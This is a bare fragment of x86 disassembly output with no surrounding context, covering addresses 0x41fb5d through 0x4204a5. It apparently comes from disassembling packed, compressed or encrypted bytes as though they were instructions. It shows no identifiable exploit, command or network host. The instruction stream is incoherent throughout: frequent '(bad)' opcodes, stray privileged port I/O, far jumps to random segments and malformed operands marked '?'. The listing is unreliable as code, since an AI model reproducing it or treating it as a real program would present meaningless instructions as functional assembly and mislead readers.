  41fb5d:	jne    0x41faf0
  41fb5f:	dec    ebx
  41fb60:	aas    
  41fb61:	mov    al,ds:0xbeb25e1c
  41fb66:	adc    DWORD PTR [esi+0x2cbad5bf],ebp
  41fb6c:	mov    eax,0xa99bf6eb
  41fb71:	pop    esi
  41fb72:	jbe    0x41fb1d
  41fb74:	sar    cl,1
  41fb76:	aad    0x1a
  41fb78:	sti    
  41fb79:	fdivr  st(4),st
  41fb7b:	or     DWORD PTR [ebx-0x63],esi
  41fb7e:	sub    ebx,edx
  41fb80:	mov    WORD PTR [esi],ds
  41fb82:	or     al,0x11
  41fb84:	xchg   ebx,eax
  41fb85:	cs sub al,0x15
  41fb88:	aaa    
  41fb89:	int3   
  41fb8a:	es mov dl,0xc5
  41fb8d:	frstor cs:[edi-0x7c29c5e6]
  41fb94:	sbb    BYTE PTR [ebp-0x410de249],bh
  41fb9a:	pop    edi
  41fb9b:	ror    DWORD PTR ds:0xfae9f94e,cl
  41fba1:	stos   DWORD PTR es:[edi],eax
  41fba2:	std    
  41fba3:	addr16 jmp 0x41fbeb
  41fba6:	sbb    eax,0x301d8282
  41fbab:	fwait
  41fbac:	mov    edi,0x4f755d9
  41fbb1:	sbb    ecx,DWORD PTR [esi+ecx*4]
  41fbb4:	nop
  41fbb5:	jae    0x41fb40
  41fbb7:	(bad)  
  41fbb8:	enter  0x6db6,0x21
  41fbbc:	das    
  41fbbd:	es (bad) 
  41fbbf:	in     al,dx
  41fbc0:	ret    0xe3d7
  41fbc3:	or     DWORD PTR [ebp+0x2cc10ee1],edi
  41fbc9:	add    edi,DWORD PTR ds:0x965d4140
  41fbcf:	sti    
  41fbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbd1:	and    ebp,esp
  41fbd3:	sub    eax,DWORD PTR [edx+0x1f]
  41fbd6:	and    DWORD PTR [ecx+0x601650e],0xffffffb9
  41fbdd:	push   es
  41fbde:	pop    ecx
  41fbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe0:	outs   dx,DWORD PTR ds:[esi]
  41fbe1:	xchg   ebp,eax
  41fbe2:	push   ebx
  41fbe3:	sbb    BYTE PTR [edi+ebx*8+0x3bb968fe],bh
  41fbea:	shl    BYTE PTR [edx],1
  41fbec:	(bad)
  41fbf0:	inc    ebp
  41fbf1:	fsubr  DWORD PTR [ebx]
  41fbf3:	das    
  41fbf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf5:	std    
  41fbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf7:	popa   
  41fbf8:	test   BYTE PTR [ecx+0x79],dl
  41fbfb:	add    eax,DWORD PTR [esi]
  41fbfd:	(bad)  
  41fbfe:	sub    DWORD PTR [eax+0x15705822],ebx
  41fc04:	xchg   BYTE PTR es:[edi-0x33],dl
  41fc08:	mov    ds:0xe297614c,al
  41fc0d:	int3   
  41fc0e:	test   al,0x1a
  41fc10:	ret    
  41fc11:	sbb    DWORD PTR [esi-0x3b],ecx
  41fc14:	out    0xb0,al
  41fc16:	add    eax,0x90c10a7f
  41fc1b:	int    0xb1
  41fc1d:	xchg   ecx,eax
  41fc1e:	sbb    BYTE PTR [edx+0x289ea01e],al
  41fc24:	cmc    
  41fc25:	ins    BYTE PTR es:[edi],dx
  41fc26:	popa   
  41fc27:	cmc    
  41fc28:	xchg   edx,eax
  41fc29:	(bad)  
  41fc2a:	jmp    0xeb72:0x9af5778c
  41fc31:	adc    DWORD PTR [ecx+0x1c],ebp
  41fc34:	adc    al,0x9e
  41fc36:	out    dx,al
  41fc37:	xlat   BYTE PTR ds:[ebx]
  41fc38:	fimul  WORD PTR [esi+0x2fa375bc]
  41fc3e:	ins    DWORD PTR es:[edi],dx
  41fc3f:	jno    0x41fc82
  41fc41:	inc    ecx
  41fc42:	iret   
  41fc43:	jp     0x41fcaa
  41fc45:	loopne 0x41fbe0
  41fc47:	dec    ecx
  41fc48:	push   sp
  41fc4a:	fst    DWORD PTR [edx+ecx*2+0x71]
  41fc4e:	adc    al,0x1f
  41fc50:	jnp    0x41fbfe
  41fc52:	mov    ecx,0xb32e8cd9
  41fc57:	shl    DWORD PTR ds:0x34d5a4c,cl
  41fc5d:	sub    eax,0x595353c7
  41fc62:	push   ds
  41fc63:	add    eax,0x6653982c
  41fc68:	pop    ebp
  41fc69:	xor    eax,0x59225232
  41fc6e:	(bad)
  41fc71:	dec    ecx
  41fc72:	adc    dl,BYTE PTR [edi+0x27a0b0d3]
  41fc78:	in     eax,dx
  41fc79:	js     0x41fc44
  41fc7b:	ret    
  41fc7c:	dec    eax
  41fc7d:	adc    al,0xc6
  41fc7f:	shr    BYTE PTR [esi-0x33],1
  41fc82:	cwde   
  41fc83:	mov    esp,0x97659be7
  41fc88:	jno    0x41fcd6
  41fc8a:	push   ecx
  41fc8b:	(bad)
  41fc8f:	das    
  41fc90:	loop   0x41fca9
  41fc92:	mov    esp,0xe1e8c72d
  41fc97:	rcr    ebp,0x1c
  41fc9a:	dec    ecx
  41fc9b:	int3   
  41fc9c:	xor    BYTE PTR [ebp+0x67],al
  41fc9f:	adc    ebp,DWORD PTR [eax+0x7d88cdf4]
  41fca5:	rol    ecx,0xec
  41fca8:	pop    edi
  41fca9:	or     esi,DWORD PTR [ebp-0x4dc100a4]
  41fcaf:	cmp    BYTE PTR [ecx+0x57cdc17],bl
  41fcb5:	sub    eax,ecx
  41fcb7:	cli    
  41fcb8:	cmc    
  41fcb9:	jge    0x41fc3e
  41fcbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbc:	pop    edx
  41fcbd:	adc    DWORD PTR [ebp+0x1804ea30],0x54
  41fcc4:	sub    eax,0xb044ab9b
  41fcc9:	add    al,0x9e
  41fccb:	xchg   ebx,eax
  41fccc:	mov    esi,0xadeae9dc
  41fcd1:	bound  esp,QWORD PTR [edx-0x3e68a653]
  41fcd7:	adc    eax,0x74a51afa
  41fcdc:	(bad)  
  41fcdd:	lgs    esp,FWORD PTR [esi]
  41fce0:	dec    eax
  41fce1:	rol    al,0x6b
  41fce4:	pop    esp
  41fce5:	or     al,0xf5
  41fce7:	dec    ebp
  41fce8:	adc    ecx,0xf1f9d07f
  41fcee:	clc    
  41fcef:	sbb    eax,0xbe009150
  41fcf4:	adc    dh,BYTE PTR [ecx-0x56eddb4c]
  41fcfa:	mov    dx,0x9b9
  41fcfe:	dec    edx
  41fcff:	imul   ecx,DWORD PTR [esi],0x6997cf30
  41fd05:	in     eax,0xc4
  41fd07:	and    al,BYTE PTR ds:0xa0088ca0
  41fd0d:	and    DWORD PTR [ebp-0x19],0xdee11918
  41fd14:	ret    
  41fd15:	jg     0x41fd36
  41fd17:	pop    edx
  41fd18:	xchg   ecx,eax
  41fd19:	mov    eax,0x20183d34
  41fd1e:	xor    al,0xf6
  41fd20:	pushf  
  41fd21:	outs   dx,BYTE PTR ds:[esi]
  41fd22:	dec    ebp
  41fd23:	xchg   ebx,eax
  41fd24:	or     ebp,ebx
  41fd26:	xchg   ebx,eax
  41fd27:	int3   
  41fd28:	ins    BYTE PTR es:[edi],dx
  41fd29:	push   0xf9d8c87c
  41fd2e:	inc    esi
  41fd2f:	inc    esi
  41fd30:	inc    eax
  41fd31:	out    0x75,eax
  41fd33:	xchg   ebp,eax
  41fd34:	pop    esp
  41fd35:	repz popa 
  41fd37:	out    dx,al
  41fd38:	push   esi
  41fd39:	(bad)  
  41fd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd3b:	cmp    ebp,ebx
  41fd3d:	mov    al,0x33
  41fd3f:	(bad)  
  41fd40:	push   esp
  41fd41:	fidivr DWORD PTR [edx]
  41fd43:	scas   al,BYTE PTR es:[edi]
  41fd44:	jae    0x41fcd0
  41fd46:	jmp    0x7378c14b
  41fd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd4c:	xor    ebx,DWORD PTR [esi+0x66800a99]
  41fd52:	repz cwde 
  41fd54:	cli    
  41fd55:	fnsave [edx]
  41fd57:	xor    DWORD PTR [ecx+0x4c576254],ecx
  41fd5d:	mov    ds:0x90d76f5c,al
  41fd62:	iret   
  41fd63:	(bad)  
  41fd64:	ja     0x41fd48
  41fd66:	cs xchg ebx,eax
  41fd68:	jb     0x41fdce
  41fd6a:	push   edx
  41fd6b:	mov    ah,0xb2
  41fd6d:	shl    DWORD PTR [ecx-0x50],1
  41fd70:	in     al,0xc2
  41fd72:	outs   dx,BYTE PTR ds:[esi]
  41fd73:	loopne 0x41fde9
  41fd75:	push   0x42
  41fd77:	pop    ss
  41fd78:	push   edx
  41fd79:	xchg   BYTE PTR [ebx+0x53],ch
  41fd7c:	out    0x9a,al
  41fd7e:	or     cl,BYTE PTR [esi+esi*8-0x58fb0830]
  41fd85:	(bad)  
  41fd87:	xchg   esi,eax
  41fd88:	inc    esp
  41fd89:	or     BYTE PTR [ebp-0x1966b251],dh
  41fd8f:	mov    dl,BYTE PTR [edi]
  41fd91:	jb     0x41fd43
  41fd93:	loop   0x41fdb6
  41fd95:	mov    DWORD PTR [edx],0x833c5473
  41fd9b:	mov    edi,0x0
	...
  41ff70:	daa    
  41ff71:	and    eax,0xbb873b85
  41ff76:	mov    edi,0xe22d13d
  41ff7b:	pusha  
  41ff7c:	in     eax,0xec
  41ff7e:	mov    bl,0xc2
  41ff80:	dec    ebx
  41ff81:	ja     0x41ff84
  41ff83:	add    BYTE PTR [edx],ah
  41ff85:	pop    es
  41ff86:	add    BYTE PTR [eax],al
  41ff88:	or     BYTE PTR [ebp-0x6b5cdc14],dl
  41ff8e:	inc    esi
  41ff8f:	outs   dx,DWORD PTR ds:[esi]
  41ff90:	popa   
  41ff91:	pop    edi
  41ff92:	mov    dh,0xf5
  41ff94:	jbe    0x41ff69
  41ff96:	sti    
  41ff97:	jno    0x41ffd6
  41ff99:	mov    edx,0x84bb3bac
  41ff9e:	push   ebx
  41ff9f:	jo     0x41ff9e
  41ffa1:	mov    ecx,0xf3e8b727
  41ffa6:	jno    0x41ff62
  41ffa8:	mov    cl,BYTE PTR [ebx]
  41ffaa:	mov    al,0xe9
  41ffac:	dec    DWORD PTR [ebx-0x48]
  41ffaf:	xor    ch,BYTE PTR [ecx+0x69fdb74c]
  41ffb5:	aaa    
  41ffb6:	pop    ecx
  41ffb7:	inc    ecx
  41ffb8:	xor    DWORD PTR [eax+0x60],esp
  41ffbb:	lods   eax,DWORD PTR ds:[esi]
  41ffbc:	inc    esp
  41ffbd:	xlat   BYTE PTR ds:[ebx]
  41ffbe:	dec    esp
  41ffbf:	mov    eax,0x38e652ad
  41ffc4:	clc    
  41ffc5:	push   edi
  41ffc6:	adc    al,0x55
  41ffc8:	cmc    
  41ffc9:	jp     0x41fff7
  41ffcb:	pushf  
  41ffcc:	out    0x76,al
  41ffce:	cs sub al,0x47
  41ffd1:	and    bh,dh
  41ffd3:	loopne 0x41ff7c
  41ffd5:	sub    DWORD PTR [edi],esp
  41ffd7:	stos   WORD PTR es:[edi],ax
  41ffd9:	ds mov al,0xdf
  41ffdc:	push   edi
  41ffdd:	aaa    
  41ffde:	sbb    dl,BYTE PTR [esi+0x520f5b46]
  41ffe4:	fxch   st(2)
  41ffe6:	fistp  WORD PTR [ebx]
  41ffe8:	js     0x41ffb8
  41ffea:	mov    cl,0xa2
  41ffec:	in     al,0xd6
  41ffee:	push   esp
  41ffef:	fidivr DWORD PTR [esi]
  41fff1:	popa   
  41fff2:	pop    ebx
  41fff3:	fucomi st,st(6)
  41fff5:	int    0xc0
  41fff7:	sub    BYTE PTR [eax+edi*4+0x5838effd],bl
  41fffe:	push   edx
  41ffff:	cmp    ah,al
  420001:	adc    al,BYTE PTR [esi-0x55]
  420004:	jle    0x420008
  420006:	xor    eax,0x51a35b83
  42000b:	test   DWORD PTR [ebx-0x30],ecx
  42000e:	fs sti 
  420010:	(bad)
  420013:	jns    0x42003b
  420015:	xor    al,0x99
  420017:	push   ss
  420018:	adc    ebx,DWORD PTR [edx-0x6a]
  42001b:	stos   BYTE PTR es:[edi],al
  42001c:	ret    
  42001d:	shl    al,1
  42001f:	hlt    
  420020:	fild   DWORD PTR [edi-0x5]
  420023:	or     BYTE PTR [eax+0x30fed1f5],dh
  420029:	ret    
  42002a:	pop    ecx
  42002b:	sub    eax,0x2a8acfb
  420030:	sahf   
  420031:	mov    cl,BYTE PTR [esi]
  420033:	inc    esi
  420034:	cli    
  420035:	das    
  420036:	retf   0x2602
  420039:	xchg   ecx,eax
  42003a:	pop    esi
  42003b:	sbb    al,BYTE PTR [ecx]
  42003d:	cmp    dl,0x8e
  420040:	fsub   st(4),st
  420042:	icebp  
  420043:	add    eax,0x421dc735
  420048:	pop    ebx
  420049:	sub    eax,0xe70cc1c4
  42004e:	cdq    
  42004f:	test   al,0x87
  420051:	icebp  
  420052:	adc    BYTE PTR [edx+esi*2-0x6fe1af5e],al
  420059:	adc    eax,0x74d87b19
  42005e:	popf   
  42005f:	mov    esi,DWORD PTR [ecx]
  420061:	pop    edx
  420062:	aam    0xb2
  420064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420065:	nop
  420066:	in     eax,dx
  420067:	mov    eax,es:0xfe4ea5ca
  42006d:	mov    ds:0x19ad796e,eax
  420072:	ficomp DWORD PTR [edi-0x4ca02390]
  420078:	sahf   
  420079:	mov    dl,ah
  42007b:	fdiv   st,st(6)
  42007d:	xchg   bl,bh
  42007f:	iret   
  420080:	in     eax,0x82
  420082:	dec    edx
  420083:	and    eax,0xb8c712f4
  420088:	push   0xffffff85
  42008a:	mov    ds:0xc7f73b56,eax
  42008f:	pop    es
  420090:	cdq    
  420091:	rol    cl,cl
  420093:	push   ss
  420094:	adc    esp,DWORD PTR [ecx]
  420096:	ds stc 
  420098:	ficom  DWORD PTR [ebx+0x5221aed4]
  42009e:	retf   
  42009f:	mov    bh,0x98
  4200a1:	sbb    al,0x14
  4200a3:	push   edi
  4200a4:	push   ss
  4200a5:	jge    0x420126
  4200a7:	inc    ebp
  4200a8:	out    0xaa,al
  4200aa:	add    al,0xe4
  4200ac:	out    dx,al
  4200ad:	mov    cs,esp
  4200af:	push   edx
  4200b0:	pop    ebx
  4200b1:	mov    DWORD PTR gs:[edi],0x2dec7003
  4200b8:	mov    bh,0x9e
  4200ba:	cmp    al,BYTE PTR [eax-0x4c]
  4200bd:	or     BYTE PTR [eax-0x74],0x2f
  4200c1:	dec    esi
  4200c2:	mov    bp,0xa358
  4200c6:	in     eax,dx
  4200c7:	ror    al,cl
  4200c9:	lods   eax,DWORD PTR ds:[esi]
  4200ca:	ds in  al,dx
  4200cc:	int    0x46
  4200ce:	nop
  4200cf:	rol    DWORD PTR [ebx-0x6],0x4b
  4200d3:	shl    eax,0x28
  4200d6:	jae    0x420154
  4200d8:	das    
  4200d9:	push   esi
  4200da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200db:	fbld   TBYTE PTR [edi-0x4d]
  4200de:	pop    ebx
  4200df:	das    
  4200e0:	mov    ch,0x36
  4200e2:	stos   BYTE PTR es:[edi],al
  4200e3:	sub    eax,0x279cdbc1
  4200e8:	dec    DWORD PTR [eax-0x7f]
  4200eb:	outs   dx,BYTE PTR ds:[esi]
  4200ec:	dec    esi
  4200ed:	cmp    esi,edx
  4200ef:	test   DWORD PTR [edi+0x7084360a],ebx
  4200f5:	out    dx,eax
  4200f6:	cmp    bh,BYTE PTR [ebx-0x75]
  4200f9:	sbb    al,0x8f
  4200fb:	aas    
  4200fc:	bound  edx,QWORD PTR [ebp+0x296ec64a]
  420102:	add    al,0x5f
  420104:	jnp    0x4200dc
  420106:	mov    ch,0x36
  420108:	jge    0x420131
  42010a:	out    dx,eax
  42010b:	inc    edx
  42010c:	lea    ebp,[ebx-0x30e230e0]
  420112:	call   0xaa4efc44
  420117:	push   ebp
  420118:	xchg   ebx,eax
  420119:	push   cs
  42011a:	repz or DWORD PTR [edi-0x62e6e5bf],esi
  420121:	(bad)  
  420122:	fld    QWORD PTR [ebx]
  420124:	adc    bl,dh
  420126:	in     al,dx
  420127:	lock je 0x4200ad
  42012a:	ret    
  42012b:	data16 or al,BYTE PTR [ebx+edi*2+0xf]
  420130:	mov    bl,BYTE PTR [esi-0x6daec95f]
  420136:	mov    esi,DWORD PTR [esi]
  420138:	loope  0x420182
  42013a:	sahf   
  42013b:	add    al,0xca
  42013d:	add    BYTE PTR [ebp+0x3f],0x3b
  420141:	adc    al,0x66
  420143:	ins    DWORD PTR es:[edi],dx
  420144:	push   eax
  420145:	xor    al,0xf1
  420147:	ss mov ebp,0x1c342dfd
  42014d:	xlat   BYTE PTR ds:[ebx]
  42014e:	sub    dh,BYTE PTR [ecx+0x1a]
  420151:	shr    BYTE PTR [esp+ebp*2],cl
  420154:	daa    
  420155:	int3   
  420156:	or     cl,BYTE PTR [ebx]
  420158:	iret   
  420159:	ror    BYTE PTR [edx+0x6ddc2933],1
  42015f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420160:	shl    dh,cl
  420162:	push   ecx
  420163:	gs add ecx,esi
  420166:	pop    eax
  420167:	(bad)  [ebx]
  420169:	xchg   DWORD PTR [edx-0xd],esp
  42016c:	and    BYTE PTR [eax+edx*1+0x1b],ah
  420170:	test   al,0xf1
  420172:	jno    0x4201c3
  420174:	mov    esi,0x45590049
  420179:	jae    0x4201b6
  42017b:	sbb    bl,dl
  42017d:	iret   
  42017e:	xchg   edx,eax
  42017f:	mov    eax,0x5dffadcd
  420184:	jnp    0x4201eb
  420186:	xor    BYTE PTR [edx],0x13
  420189:	jl     0x4201ea
  42018b:	cld    
  42018c:	xchg   esp,eax
  42018d:	fwait
  42018e:	and    al,0x44
  420190:	xchg   edi,eax
  420191:	pop    ebp
  420192:	sar    eax,cl
  420194:	cmp    bl,dh
  420196:	or     ecx,DWORD PTR [eax+eiz*4+0x62]
  42019a:	inc    ecx
  42019b:	sub    al,BYTE PTR [ebp-0x58daa71e]
  4201a1:	sub    eax,0x7cde513e
  4201a6:	xor    cl,BYTE PTR [edi-0x5f91e94f]
  4201ac:	popa   
  4201ad:	dec    ebx
  4201ae:	nop
  4201af:	mov    bh,0x1e
  4201b1:	cli    
  4201b2:	xchg   ecx,ecx
  4201b4:	push   esp
  4201b5:	sub    BYTE PTR [edi],0x5b
  4201b8:	push   edx
  4201b9:	ss (bad) 
  4201bb:	out    dx,al
  4201bc:	cmp    esp,ebx
  4201be:	inc    ebp
  4201bf:	add    BYTE PTR [eax+eiz*1],ch
  4201c2:	mov    ebp,0x97c5412
  4201c7:	pop    ecx
  4201c8:	lods   eax,DWORD PTR ds:[esi]
  4201c9:	adc    al,0x6f
  4201cb:	(bad)  
  4201cc:	call   0xd2d76811
  4201d1:	shl    BYTE PTR [eax+eiz*8],cl
  4201d4:	int    0xaf
  4201d6:	loopne 0x420219
  4201d8:	into   
  4201d9:	jecxz  0x4201a7
  4201db:	in     al,dx
  4201dc:	arpl   sp,bx
  4201de:	mov    ebx,0x8a36d5dd
  4201e3:	test   eax,0x94c34be7
  4201e8:	iret   
  4201e9:	lahf   
  4201ea:	fs push ss
  4201ec:	pop    ebp
  4201ed:	scas   al,BYTE PTR es:[edi]
  4201ee:	push   edi
  4201ef:	pop    ebx
  4201f0:	cmc    
  4201f1:	pop    ds
  4201f2:	add    ch,BYTE PTR [esi+eiz*4-0x4b1cceca]
  4201f9:	adc    ebp,DWORD PTR [edi+0x3864fe89]
  4201ff:	bound  eax,QWORD PTR cs:[ecx-0x5c17ac2b]
  420206:	imul   ecx,DWORD PTR [ebp+eax*1+0x2f],0x546b0e7
  42020e:	dec    eax
  42020f:	lahf   
  420210:	xor    eax,esp
  420212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420213:	lods   eax,DWORD PTR ds:[esi]
  420214:	test   ebp,edi
  420216:	jb     0x4201a0
  420218:	or     DWORD PTR [ebp+eiz*8+0xbb510a0],ebp
  42021f:	mov    edx,0xa76a3a2e
  420224:	outs   dx,DWORD PTR ds:[esi]
  420225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420226:	popw   ds
  420228:	(bad)  
  420229:	jle    0x4201c6
  42022b:	imul   DWORD PTR [eax-0x61]
  42022e:	ds jl  0x4201e4
  420231:	(bad)  
  420233:	leave  
  420234:	xor    eax,0x5481353f
  420239:	fsub   QWORD PTR [edx+0x6f]
  42023c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42023d:	repnz sbb al,0x26
  420240:	pop    esi
  420241:	gs push esp
  420243:	fsubr  DWORD PTR [eax-0x56]
  420246:	(bad)  
  420247:	js     0x420297
  420249:	dec    ebp
  42024a:	jge    0x420257
  42024c:	jmp    0x765576d5
  420251:	xor    al,0xef
  420253:	aam    0xff
  420255:	sbb    esi,ebp
  420257:	pop    ss
  420258:	call   0xbdf2:0xa6f0e809
  42025f:	dec    ebx
  420260:	add    eax,0x95cbc967
  420265:	loop   0x420230
  420267:	rol    BYTE PTR [ebx+0x2b],0x99
  42026b:	mov    ebp,0xc122e98b
  420270:	xchg   edx,edi
  420272:	lea    esi,[ebp-0x30]
  420275:	add    ch,BYTE PTR [ebx+ebx*2-0x63]
  420279:	ds sbb al,0x87
  42027c:	lea    ebp,[edi+0x14]
  42027f:	lods   eax,DWORD PTR ds:[esi]
  420280:	xor    dl,BYTE PTR [edx+0x5c]
  420283:	jnp    0x42029a
  420285:	aad    0x15
  420287:	(bad)  
  420288:	mov    edi,0x191515da
  42028d:	in     eax,0x8e
  42028f:	adc    DWORD PTR [edx],ebx
  420291:	xor    esi,DWORD PTR [esi+0x2dd5f30a]
  420297:	icebp  
  420298:	cmovbe esi,eax
  42029b:	or     ebx,0xc674e0e5
  4202a1:	cmp    BYTE PTR [ebx],0xcb
  4202a4:	push   ds
  4202a5:	sahf   
  4202a6:	adc    DWORD PTR [ebx+0x34],ecx
  4202a9:	dec    ebx
  4202aa:	fwait
  4202ab:	add    edx,DWORD PTR [ecx-0x4e]
  4202ae:	sbb    al,0x6a
  4202b0:	jae    0x42030b
  4202b2:	call   FWORD PTR ds:0x75efe7e0
  4202b8:	out    dx,eax
  4202b9:	call   0x158f:0xeb7c8f24
  4202c0:	mov    ebp,0xb0d1b28a
  4202c5:	repz enter 0xb38d,0x89
  4202ca:	cld    
  4202cb:	dec    esp
  4202cc:	jo     0x420310
  4202ce:	ins    BYTE PTR es:[edi],dx
  4202cf:	mov    ebx,0x19720cf
  4202d4:	or     al,0xda
  4202d6:	jb     0x420299
  4202d8:	mov    dh,0x7
  4202da:	js     0x420328
  4202dc:	push   esi
  4202dd:	enter  0xf126,0xea
  4202e1:	enter  0x428a,0xef
  4202e5:	lods   al,BYTE PTR ds:[esi]
  4202e6:	mov    esi,0x1620f64
  4202eb:	dec    edx
  4202ec:	adc    DWORD PTR [ebx],0xd54610ad
  4202f2:	std    
  4202f3:	in     al,0xcc
  4202f5:	sub    ah,BYTE PTR [edi]
  4202f7:	push   0x17beb59b
  4202fc:	mov    cl,0x53
  4202fe:	leave  
  4202ff:	ficom  DWORD PTR [edi-0x24]
  420302:	adc    DWORD PTR [edi-0x19],edi
  420305:	inc    esi
  420306:	icebp  
  420307:	mov    edi,?
  420309:	and    esi,0x4f
  42030c:	retf   0xcc08
  42030f:	xchg   ecx,eax
  420310:	pop    ecx
  420311:	mov    dl,0x13
  420313:	push   esp
  420314:	cmp    DWORD PTR [edi-0x16],esi
  420317:	dec    eax
  420318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420319:	sbb    DWORD PTR [ebx-0x4215c732],0x85783ee6
  420323:	lock pop eax
  420325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420326:	mov    cl,0xeb
  420328:	push   ebp
  420329:	leave  
  42032a:	outs   dx,DWORD PTR ds:[esi]
  42032b:	mov    eax,0x29a43e1a
  420330:	icebp  
  420331:	mov    edi,DWORD PTR [edx-0x35d316a5]
  420337:	mov    BYTE PTR [esi],dh
  420339:	fisttp DWORD PTR [ecx-0x77fabc2c]
  42033f:	loope  0x4202e5
  420341:	cli    
  420342:	pop    ebx
  420343:	dec    esp
  420344:	(bad)  
  420345:	addr16 cmp ch,ch
  420348:	sub    eax,0xfcf5771f
  42034d:	mov    esp,ecx
  42034f:	xor    BYTE PTR [ecx],ah
  420351:	stc    
  420352:	ins    DWORD PTR es:[edi],dx
  420353:	pop    ebp
  420354:	lds    ecx,FWORD PTR [ecx+0x1d]
  420357:	inc    esp
  420358:	sbb    al,0x5c
  42035a:	rcl    DWORD PTR [edx],0x62
  42035d:	push   esp
  42035e:	push   ds
  42035f:	or     al,0x21
  420361:	push   es
  420362:	inc    ebx
  420363:	cdq    
  420364:	stos   DWORD PTR es:[edi],eax
  420365:	pop    esp
  420366:	sub    ebp,esi
  420368:	xor    al,0x9a
  42036a:	xor    al,0x41
  42036c:	dec    ecx
  42036d:	sub    eax,DWORD PTR [edi]
  42036f:	pop    eax
  420370:	cmp    ebp,DWORD PTR [ecx-0x50]
  420373:	mov    esp,DWORD PTR [esi+0x5f823ed7]
  420379:	stos   BYTE PTR es:[edi],al
  42037a:	rol    ecx,0xda
  42037d:	outs   dx,BYTE PTR ds:[esi]
  42037e:	out    0x97,al
  420380:	xor    esi,esp
  420382:	pop    es
  420383:	inc    edi
  420384:	dec    esp
  420385:	mov    esp,0xcebd5dbb
  42038a:	mov    ecx,0x246eb516
  42038f:	lods   al,BYTE PTR ds:[esi]
  420390:	mov    al,0xc2
  420392:	xchg   DWORD PTR [ebx+0x72122aa3],ebx
  420398:	xor    cl,ch
  42039a:	call   0x115a:0xa71fac72
  4203a1:	adc    eax,0xe64e19b5
  4203a6:	jo     0x42034c
  4203a8:	stos   BYTE PTR es:[edi],al
  4203a9:	dec    ecx
  4203aa:	fisub  WORD PTR [edi+0xd]
  4203ad:	push   0xfff74c13
  4203b2:	add    al,0xa8
  4203b4:	cmc    
  4203b5:	rol    DWORD PTR [ebp+0x4b],1
  4203b8:	jecxz  0x4203a7
  4203ba:	mov    ss,WORD PTR [esp+esi*8]
  4203bd:	out    0x22,al
  4203bf:	in     al,dx
  4203c0:	jno    0x4203ca
  4203c2:	out    0x3d,eax
  4203c4:	ret    
  4203c5:	xchg   ebx,eax
  4203c6:	sbb    al,0x3
  4203c8:	add    ecx,DWORD PTR [edi]
  4203ca:	sbb    eax,0x54f502bb
  4203cf:	hlt    
  4203d0:	popf   
  4203d1:	popa   
  4203d2:	xchg   bl,al
  4203d4:	in     eax,dx
  4203d5:	mov    eax,0xb7fcef10
  4203da:	mov    ?,WORD PTR [edx+0x62]
  4203dd:	scas   eax,DWORD PTR es:[edi]
  4203de:	(bad)  
  4203df:	dec    edi
  4203e0:	or     edi,DWORD PTR [ebx]
  4203e2:	inc    ebx
  4203e3:	cmc    
  4203e4:	mov    ebx,0x3b9bb774
  4203e9:	xchg   esp,eax
  4203ea:	fnstsw WORD PTR [esi+0x2ac3c916]
  4203f0:	xchg   edx,eax
  4203f1:	ja     0x4203a9
  4203f3:	das    
  4203f4:	xchg   DWORD PTR [eax+eiz*4],edx
  4203f7:	cdq    
  4203f8:	iret   
  4203f9:	mov    ah,0x7e
  4203fb:	fcmove st,st(2)
  4203fd:	in     al,dx
  4203fe:	mov    ?,WORD PTR [esi]
  420400:	add    ebp,DWORD PTR [ecx-0x18]
  420403:	cwde   
  420404:	rcl    BYTE PTR [esi],cl
  420406:	repz in al,0x54
  420409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42040a:	cmp    esp,edi
  42040c:	(bad)  
  42040d:	xor    al,0x98
  42040f:	mov    DWORD PTR [ebp-0x3a],ebp
  420412:	into   
  420413:	es mov bh,0x25
  420416:	pop    edx
  420417:	cld    
  420418:	jp     0x4203dc
  42041a:	aad    0xb0
  42041c:	xor    BYTE PTR [ebx-0x784cc05e],0x9e
  420423:	dec    edx
  420424:	scas   al,BYTE PTR es:[edi]
  420425:	repz fimul WORD PTR [esi]
  420428:	push   eax
  420429:	or     BYTE PTR [esi-0x64],dh
  42042c:	or     BYTE PTR [esi+0x687b9a69],al
  420432:	pushf  
  420433:	jb     0x4204a8
  420435:	sbb    DWORD PTR [ebx],0xd4425687
  42043b:	pushf  
  42043c:	mov    ecx,eax
  42043e:	and    BYTE PTR [edx],0x56
  420441:	pusha  
  420442:	jecxz  0x420447
  420444:	fsub   QWORD PTR [ebx]
  420446:	and    BYTE PTR [edi-0x2b],dh
  420449:	stos   BYTE PTR es:[edi],al
  42044a:	or     DWORD PTR cs:[ecx-0x6f],0xb
  42044f:	retf   0x39f0
  420452:	jno    0x4204be
  420454:	sbb    eax,0x7d3a4614
  420459:	pop    ebp
  42045a:	mov    cl,0xde
  42045c:	sub    eax,0xffffff8d
  42045f:	jns    0x420433
  420461:	ins    DWORD PTR es:[edi],dx
  420462:	mov    ecx,0xee58b20f
  420467:	test   eax,0xf328b342
  42046c:	imul   edx,ebx,0xdfa97f67
  420472:	test   DWORD PTR [ecx+0x5],ebx
  420475:	out    0x85,eax
  420477:	push   0x8b756c92
  42047c:	out    dx,eax
  42047d:	shl    al,cl
  42047f:	or     eax,0x80a00147
  420484:	addr16 jg 0x420457
  420487:	das    
  420488:	call   0xd79fb8e7
  42048d:	int    0xee
  42048f:	(bad)  
  420490:	repnz inc edx
  420492:	sub    BYTE PTR [ebx+0x4],ch
  420495:	sbb    dl,dl
  420497:	jp     0x420425
  420499:	ss inc edi
  42049b:	mov    gs,WORD PTR [edx-0x4]
  42049e:	and    BYTE PTR [esi-0x55],0x2d
  4204a2:	jl     0x4204ba
  4204a4:	inc    esp
  4204a5:	mov    ah,dl
